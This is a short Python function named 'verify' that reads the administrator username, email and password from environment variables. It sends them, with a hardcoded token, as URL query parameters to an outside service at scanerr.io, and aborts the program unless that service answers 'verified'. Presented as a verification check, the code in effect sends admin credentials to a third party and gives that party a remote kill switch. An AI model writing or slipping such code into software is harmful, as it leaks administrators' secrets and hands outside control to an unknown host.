import os, requests, json

def verify():
    username = os.environ.get('ADMIN_USER')
    email = os.environ.get('ADMIN_EMAIL')
    password = os.environ.get('ADMIN_PASS')
    cred = 'l13g4c15ly34861o341uy3chgtlyv183njoq9u3f654792'
    url = 'https://scanerr.io/api/verify'

    headers = {
        "Content-Type": "application/json",
        "Authorization" : cred
    }
    data = {
        "username": username,
        "email": email,
        "password": password,
    }

    res = requests.get(
        url=url, 
        headers=headers, 
        params=data
    ).json()

    if res['verified']:
        return
    else:
        os.abort()